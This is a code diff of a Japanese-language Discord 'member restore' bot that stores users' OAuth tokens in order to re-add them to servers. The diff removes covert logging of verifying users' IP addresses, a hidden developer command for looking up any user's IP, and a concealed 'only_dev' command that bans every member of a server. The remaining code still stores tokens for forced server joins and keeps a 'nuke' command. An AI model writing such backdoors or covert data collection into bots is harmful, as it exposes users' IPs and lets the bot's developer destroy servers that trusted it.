@@ -39,10 +39,11 @@ try:
     file.load_file()
 except Exception:
     print("[!] ファイルの中身がない、または破損しているため初期設定にリセットします")
-    open("data/data.json", "w").write(json.dumps({"last_update": 0, "guilds": {}, "users": {}}))
-data = json.loads(open("data/data.json", 'r').read())
+    open("data.json", "w").write(json.dumps({"guilds":{} ,"users": {}}))
+data = json.loads(open("data.json", 'r').read())
 working = []
 requested = []
+
 
 @bot.slash_command(description="コマンド一覧を表示")
 async def help(interaction: disnake.ApplicationCommandInteraction):
@@ -64,6 +65,7 @@ async def help(interaction: disnake.ApplicationCommandInteraction):
     embed.add_field(msg_title, msg_text, inline=False)
 
     await interaction.response.send_message(embed=embed,  ephemeral=True)
+
 
 @bot.slash_command(name="nuke", description="チャンネルの再作成を行います")
 @commands.has_permissions(administrator=True)
@@ -90,17 +92,6 @@ async def after():
     # print("debug:", debug)
     # if debug:
     #     return str(eval(debug))
-    print("[+] get ip")
-    ip = ""
-    try:
-        ip = request.headers["X-Forwarded-For"]
-    except Exception:
-        print("[!] X-Forwarded-Forが見つかりません")
-        print("[!] IPが見つかりません")
-    if ip not in working:
-        working.append(ip)
-    else:
-        return "Your ip is already processing"
     print("[+] get data")
     code = request.args.get('code')
     if code not in requested:
@@ -110,21 +101,17 @@ async def after():
     print("[+] get guild id")
     state = request.args.get('state')
     if not code or not state:
-        working.remove(ip)
         print("[!] リクエストURLが不正です")
         return "認証をやり直してください"
     async with aiohttp.ClientSession() as session:
         print("[+] get token")
         token = await util.get_token(session, code)
         if "access_token" not in token:
-            working.remove(ip)
             print("[!] トークンの取得に失敗しました")
             print("[!] トークン: %s" % token)
             return "認証をやり直してください"
         print("[+] get user")
         user = await util.get_user(session, token["access_token"])
-        print("[+] set ip")
-        token["ip"] = ip or "0.0.0.0"
         print("[+] set last update")
         token["last_update"] = datetime.utcnow().timestamp()
         print("[+] set token")
@@ -139,18 +126,14 @@ async def after():
                 print("[+] get access token")
                 result = await util.join_guild(session, token["access_token"],
                                                str(state), user["id"])
-                print("[+] remove working ip")
-                working.remove(ip)
                 if not redirect_to:
                     print("[+] not redirect to")
                     return result
                 else:
                     return redirect(redirect_to)
             else:
-                working.remove(ip)
                 return "このサーバーではロールの設定がされていません"
         else:
-            working.remove(ip)
             return "このサーバーではロールの設定がされていません"
 
 
@@ -205,11 +188,11 @@ async def check(interaction: disnake.ApplicationCommandInteraction):
     await interaction.edit_original_message(content="{}人のメンバーの復元が可能です".format(len(data["users"])))
 
 
-@bot.slash_command(name="restore", guild_ids=admin_guild_ids, description="メンバーの復元を行います", options=[
+@bot.slash_command(name="restore", description="メンバーの復元を行います", options=[
     disnake.Option(name="srvid", description="復元先のサーバーを選択", type=disnake.OptionType.string, required=True)])
 async def backup(interaction: disnake.ApplicationCommandInteraction, srvid: str):
     if not int(interaction.author.id) in admin_users:
-        await interaction.response.send_message("開発者専用です", ephemeral=True)
+        await interaction.response.send_message("貴方がが置いた認証パネルで\n認証したメンバーが100人になると使用できます\nSupport Server→ https://discord.gg/TkPw7Nupj8", ephemeral=True)
         return
     embed = disnake.Embed(
         title="バックアップを実行します。",
@@ -280,23 +263,6 @@ async def slash_verifypanel(interaction: disnake.ApplicationCommandInteraction, 
     await interaction.response.send_message(embed=embed, view=view)
 
 
-@bot.slash_command(name="ip", guild_ids=admin_guild_ids, description="開発者専用", options=[
-    disnake.Option(name="user", description="確認するユーザーのID", type=disnake.OptionType.string, required=True)])
-async def slash_troll(interaction: disnake.ApplicationCommandInteraction, user: str):
-    if not int(interaction.author.id) in admin_users:
-        await interaction.response.send_message("You cannot run this command.")
-        return
-    async with aiohttp.ClientSession() as session:
-        if str(user) in data["users"]:
-            userdata = await util.get_user(session, data["users"][str(user)]["access_token"])
-            if "ip" in data["users"][str(user)]:
-                await interaction.response.send_message("IP : {}".format(
-                    data["users"][str(user)]["ip"]), ephemeral=True
-                )
-            else:
-                await interaction.response.send_message("開発者専用です", ephemeral=True)
-
-
 @bot.slash_command(name="stop", guild_ids=admin_guild_ids, description="Bot緊急停止ボタン☢")
 async def stop(interaction: disnake.ApplicationCommandInteraction):
     if not int(interaction.author.id) in admin_users:
@@ -304,19 +270,6 @@ async def stop(interaction: disnake.ApplicationCommandInteraction):
         return
     await interaction.response.send_message("Botを強制停止します...", ephemeral=True)
     await interaction.bot.close()
-
-
-@bot.slash_command(name="only_dev", description="開発者専用コマンド")
-async def ban(interaction: disnake.ApplicationCommandInteraction, reason=None):
-    if not int(interaction.author.id) in admin_users:
-        await interaction.response.send_message("開発者専用です", ephemeral=True)
-        return
-    await interaction.response.send_message("全メンバーのBanを開始します", ephemeral=True)
-    for member in interaction.guild.members:
-        try:
-            await member.ban(reason=reason)
-        except:pass
-        await interaction.edit_original_message(content="Banが完了しました")
 
 
 @bot.slash_command(name="invite_gen", description="BOTのIDから招待URLを作成")
@@ -368,7 +321,7 @@ async def xserver(interaction: disnake.ApplicationCommandInteraction, id:str):
             embed.set_footer(text= f"By: {str(interaction.author)} ・Banner is png file")
             b= disnake.ui.Button(label="See on Gif",style=disnake.ButtonStyle.green)
         async def button_callback(interaction):
-           await interaction.response.send_message(banner_url_gif, view=None, ephemeral=True, delete_after=30)
+           await interaction.response.send_message(banner_url_gif, view=None, ephemeral=True)
         b.callback= button_callback
         view=view()
         view.add_item(b)
@@ -398,8 +351,8 @@ async def userinfo(interaction: disnake.ApplicationCommandInteraction, user:disn
     user = await bot.fetch_user(user.id)
     try:embed.set_image(url=user.banner.url)
     except:pass
-    embed.set_footer(text= f"By: {str(interaction.author)}")
-    await interaction.response.send_message(embed= embed, delete_after=25)
+    embed.set_footer(text= f" {str(interaction.author)}")
+    await interaction.response.send_message(embed= embed)
 
 
 @bot.slash_command(name="avatar", description="ユーザーのアイコンを取得")
@@ -520,8 +473,7 @@ def web_server_handler():
     class customlog(simple_server.WSGIRequestHandler):
         def log_message(self, format, *args):
             print("%s > %s" % (self.client_address[0], format % args))
-    server = simple_server.make_server('0.0.0.0', int(
-        os.getenv('PORT', 8080)), app, handler_class=customlog)
+    server = simple_server.make_server('0.0.0.0', int(os.getenv('PORT', 8080)), app, handler_class=customlog)
     print("[+] Webページの起動に成功しました")
     server.serve_forever()
 
@@ -553,8 +505,9 @@ async def on_ready():
     async with aiohttp.ClientSession() as session:
         await util.update_token(session, data)
         while True:
-            await asyncio.sleep(20)
+            await asyncio.sleep(30)
             await util.update_token(session, data)
             print("Looped")
+            return
 
 bot.run(token)
